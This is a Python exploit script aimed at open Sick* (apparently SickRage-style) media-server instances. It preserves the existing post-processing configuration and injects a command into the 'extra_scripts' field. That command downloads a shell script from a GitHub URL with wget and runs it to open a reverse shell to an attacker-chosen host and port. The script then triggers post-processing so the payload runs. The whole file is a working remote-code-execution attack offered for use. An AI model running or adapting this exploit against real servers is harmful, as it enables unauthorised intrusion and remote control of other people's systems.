import requests
import argparse
from lxml import html


def get_args():
    parser = argparse.ArgumentParser(description="Exploit open instances of Sick*")
    parser.add_argument('URL', metavar="URL", help="The URL of the sick* instance to exploit - host:port")
    parser.add_argument('RHOST', metavar="RHOST", help="The IP where the exploited instance should connect to.")
    parser.add_argument('RPORT', metavar="RPORT", help="The port where the exploited instance should connect to.")
    args = parser.parse_args()
    return args


def get_current_conf(base_url):
    print "[+] Trying to get current values for some config items not to break post-processing."
    url = "%s/config/postProcessing/" % base_url
    response = requests.get(url)
    if response.status_code != 200:
        print "[-] Request failed. Is %s up?" % base_url
        exit(1)
    conf = parse_config(response.content)
    return conf


def parse_config(body):
    # Parses the body to the /config/PostProcessing page and creates a dictionary with current configuration
    # Does not parse only the current extra scripts, these will be anyway overridden by the exploit
    print "[+] Parsing current Post Processing configuration."
    conf = {
        'allowed_extensions': '',
        'alt_unrar_tool': '',
        'autopostprocessor_frequency': '',
        'delete_non_associated_files': '',
        'file_timestamp_timezone': '',
        'kodi_12plus_data': '',
        'kodi_data': '',
        'mede8er_data': '',
        'mediabrowser_data': '',
        'naming_abd_pattern': '',
        'naming_anime': '',
        'naming_anime_multi_ep': '',
        'naming_anime_pattern': '',
        'naming_multi_ep': '',
        'naming_pattern': '',
        'naming_sports_pattern': '',
        'nfo_rename': '',
        'postpone_if_sync_files': '',
        'process_automatically': '',
        'process_method': '',
        'rename_episodes': '',
        'sony_ps3_data': '',
        'sync_files': '',
        'tivo_data': '',
        'tv_download_dir': '',
        'unpack': '',
        'unpack_dir': '',
        'unrar_tool': '',
        'use_icacls': '',
        'wdtv_data': ''
    }
    tree = html.fromstring(body)
    for k in conf.keys():
        conf[k] = tree.xpath('//*[@id="%s"]' % k)[0].value
    print "[+] Successfully Parsed current configuration:"
    for k in conf.keys():
        print "\t%s: %s" % (k, conf[k])
    return conf


def exploit(conf, base_url, rhost, rport):
    print "[+] Starting to exploit %s." % base_url
    url = "%s/config/postProcessing/savePostProcessing" % base_url
    payload = '/usr/bin/wget https://raw.githubusercontent.com/Sudneo/sicksploit/master/shell.py -O ' \
              '/tmp/shell|/usr/bin/python /tmp/shell %s %s' % (rhost, rport)
    conf['extra_scripts'] = payload
    print "[+] Injecting payload: %s" % payload
    response = requests.post(url, data=conf)
    if response.status_code != 200:
        print "[-] Exploit failed. Is %s up?" % base_url
        exit(0)
    else:
        print "[+] Exploit succeeded."


def trigger_post_processing(base_url, process_dir):
    # Attempts to trigger a manual post processing to speed up the execution of the payload
    print "[+] Trigger a manual post-processing of %s to execute the injected payload." % process_dir
    params = {'force': 'on', 'proc_dir': process_dir, 'process_method': 'copy'}
    url = "%s/home/postprocess/processEpisode" % base_url
    response = requests.post(url, data=params)
    if response.status_code != 200:
        print "[-] Error in triggering post processing. Exploit might still succeed, auto post processing every 10m."
    else:
        print "[+] Manual post processing correctly scheduled. It might take a few minutes to actually get executed."


def main():
    # Get arguments
    args = get_args()
    url = args.URL
    rhost = args.RHOST
    rport = args.RPORT
    # Get current configuration not to break the post processing
    conf = get_current_conf(url)
    # Apply post-processing configuration to include malicious extra-scripts
    exploit(conf, url, rhost, rport)
    trigger_post_processing(url, conf['tv_download_dir'])


if __name__ == '__main__':
    main()


